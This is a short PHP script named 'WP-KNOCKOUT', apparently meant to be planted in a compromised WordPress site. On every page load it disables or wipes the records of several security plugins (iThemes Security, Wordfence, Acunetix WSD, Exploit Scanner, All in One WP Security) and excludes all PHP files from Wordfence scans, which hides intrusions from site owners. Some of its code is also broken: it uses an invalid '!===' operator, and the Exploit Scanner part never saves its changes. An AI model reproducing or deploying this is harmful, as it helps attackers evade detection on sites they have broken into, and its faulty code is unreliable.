<?php
//WP-KNOCKOUT by The X-C3LL
// http://0verl0ad.blogspot.com

add_action("wp_head", "knockout");
define("DB_PRE", $table_prefix);
function knockout() {
	//Kill iThemes Security
	$o = get_option("itsec_file_change");
	if ($o !== FALSE) {
		$o['enabled'] = FALSE;
		$o['email'] = FALSE;
		$o['notify_admin'] = FALSE;
		update_option("itsec_file_change",$o);
	}
	//Kill WordFence
	$con = mysql_connect(DB_HOST, DB_USER, DB_PASSWORD);
	mysql_select_db(DB_NAME);
	$query = "truncate ". DB_PRE ."wfIssues;";
	mysql_query($query);
	$query = "delete from ". DB_PRE ."wfStatus where msg like '%SUM_ENDBAD%';";
	mysql_query($query);
	$query = "update ". DB_PRE ."wfConfig set val = '*.php' where name = 'scan_exclude';";
	mysql_query($query);
	//Kill Acunetix
	$query = "truncate ". DB_PRE ."_wsd_plugin_scan;";
	mysql_query($query);
	$query = "truncate ". DB_PRE ."_wsd_plugin_scans;";
	mysql_query($query);
	//Kill Exploit Scanner
	$o = get_option("exploitscanner_results");
	if ($o !=== FALSE){
		$o = "";
	}
	$o = get_option("exploitscanner_diff_cache");
	if ($o !=== FALSE){
		$o = "0";
	}
	//Kill All in One WordPress Security
	$query = "truncate ". DB_PRE . "aiowps_global_meta;";
	mysql_query($query);
}
?>
